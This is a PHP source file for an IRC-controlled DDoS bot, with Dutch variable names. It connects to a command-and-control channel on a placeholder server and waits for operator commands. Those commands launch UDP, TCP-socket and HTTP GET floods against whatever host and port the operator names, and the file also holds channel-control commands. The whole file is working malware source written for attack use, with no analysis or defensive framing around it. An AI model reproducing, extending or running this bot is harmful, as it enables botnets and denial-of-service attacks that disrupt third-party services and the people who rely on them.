<?php


/*


PHP DDoS Bot
Version 1.0
[www.~censored~.org]


*/


$server="1.3.3.7";
$Port="6667";
$nick="bot-";$willekeurig;
$willekeurig=mt_rand(0,3);
$nicknummer=mt_rand(100000,999999);
$Channel="#WauShare";
$Channelpass="ddos";
$msg="Farewell.";

set_time_limit(0);
$loop = 0; $verbonden = 0;
$verbinden = fsockopen($server, $Port);

while ($read = fgets($verbinden,512)) {

$read = str_replace("\n","",$read); $read = str_replace("\r","",$read);
$read2 = explode(" ",$read);

if ($loop == 0) {
fputs($verbinden,"nick $nick$nicknummer\n\n");
fputs($verbinden,"USER cybercrime 0 * :woopie\n\n");
}

if ($read2[0] == "PING") { fputs($verbinden,'PONG '.str_replace(':','',$read2[1])."\n"); }

if ($read2[1] == 251) {
fputs($verbinden,"join $Channel $Channelpass\n");
$verbonden++;
}


if (eregi("bot-op",$read)) {
fputs($verbinden,"mode $Channel +o $read2[4]\n");
}


if (eregi("bot-deop",$read)) {
fputs($verbinden,"mode $Channel -o $read2[4]\n");
}

if (eregi("bot-quit",$read)) {
fputs($verbinden,"quit :$msg\n\n");
break;
}

if (eregi("bot-join",$read)) {
fputs($verbinden,"join $read2[4]\n");
}

if (eregi("bot-part",$read)) {
fputs($verbinden,"part $read2[4]\n");
}


if (eregi("ddos-udp",$read)) {
fputs($verbinden,"privmsg $Channel :ddos-udp - started udp flood - $read2[4]\n\n");
$fp = fsockopen("udp://$read2[4]", 500, $errno, $errstr, 30);
if (!$fp)
{
//echo "$errstr ($errno)<br>\n"; //troep
exit;
}
else
{
$char = "a";
for($a = 0; $a < 9999999999999; $a++)
$data = $data.$char;

if(fputs ($fp, $data) )
fputs($verbinden,"privmsg $Channel :udp-ddos - packets sended.\n\n");
else
fputs($verbinden,"privmsg $Channel :udp-ddos - <error> sending packets.\n\n");
}
}

if (eregi("ddos-tcp",$read)) {
fputs($verbinden,"part $read2[4]\n");
fputs($verbinden,"privmsg $Channel :tcp-ddos - flood $read2[4]:$read2[5] with $read2[6] sockets.\n\n");
$server = $read2[4];
$Port = $read2[5];

for($sockets = 0; $sockets < $read2[6]; $sockets++)
{
$verbinden = fsockopen($server, $Port);
}
}

if (eregi("ddos-http",$read)) {
fputs($verbinden,"part $read2[4]\n");
fputs($verbinden,"privmsg $Channel :ddos-http - http://$read2[4]:$read2[5] $read2[6] times\n\n");
$Webserver = $read2[4];
$Port = $read2[5];

$Aanvraag = "GET / HTTP/1.1\r\n";
$Aanvraag .= "Accept: */*\r\n";
$Aanvraag .= "Accept-Language: nl\r\n";
$Aanvraag .= "Accept-Encoding: gzip, deflate\r\n";
$Aanvraag .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n";
$Aanvraag .= "Host: $read2[4]\r\n";
$Aanvraag .= "Connection: Keep-Alive\r\n\r\n";

for($Aantal = 0; $Aantal < $read2[6]; $Aantal++)
{
$DoS = fsockopen($Webserver, $Port);
fwrite($DoS, $Aanvraag);
fclose($DoS);
}
}
$loop++;

}
?> 